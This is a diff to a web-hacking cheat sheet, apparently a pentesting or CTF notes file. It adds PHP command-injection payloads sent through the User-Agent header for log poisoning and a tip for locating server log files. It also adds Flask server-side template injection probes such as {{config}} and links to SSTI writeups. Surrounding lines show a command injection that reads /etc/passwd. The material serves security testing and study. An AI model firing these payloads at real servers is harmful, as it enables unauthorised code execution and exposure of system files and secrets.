@@ -111,7 +111,17 @@ $ go run main.go -u https://ns.agency -w ~/1_RECON/_WORDLISTS/Directories_Common
 Changing Content-Type:
 * `Content-Type: image/png` =>  `Content-Type: text/html`
 
-HTTP Header Injection:
+**HTTP Header Injection**  
+NOTE: inject your payload into headers by replacing/concat header value  
+
+PHP code exec:  
+```php
+/* User-Agent header injection */
+User-Agent: Mozilla <h1>hello world</h1>           // confirm
+User-Agent: Mozilla <?php shell_exec('bin/ls');?>  // cmd injection #1
+User-Agent: Mozilla <?php system('bin/ls');?>      // cmd injection #2
+User-Agent: Mozilla <?php passthru('bin/ls');?>    // cmd injection #3 
+```
 
 
 ### ============================================================
@@ -145,6 +155,7 @@ domain.com/?class=something&function=another
 
 STEP #2: Figure out where the logfiles are. Example locations:
 * NOTE: If you can execute phpinfo(); then you can find out where access/error logs are stored on the server.
+* For non-default locations, try to figure out where they install their PHP, Nginx, Apache and look in there.
 ```
 // PHP Logfiles:
 /usr/local/etc/php
@@ -426,8 +437,22 @@ original_cmd_by_server $(cat /etc/passwd)
 ```  
 
 **Server-Side Template Injection (SSTI)**
-
 Tool: https://github.com/epinna/tplmap
+
+READ SOME SSTI writeups:
+* https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/
+* https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/
+* https://meem67.github.io/blog/2017-02-16/BSidesSF_writeups.html#Zumbo1 
+* https://0day.work/bsidessf-ctf-2017-web-writeups/#zumbo1
+* https://hackerone.com/reports/125980
+
+Finding Flask template injection:  
+NOTE: URL ENCODE YOUR PAYLOADS (highlight payload in Burp -> right click -> convert selection -> url encode)
+```
+{{4+4}}
+{{request}}
+{{config}}
+```
 
 Working AngularJS payload (EXT BREAK #2):
 ```angular
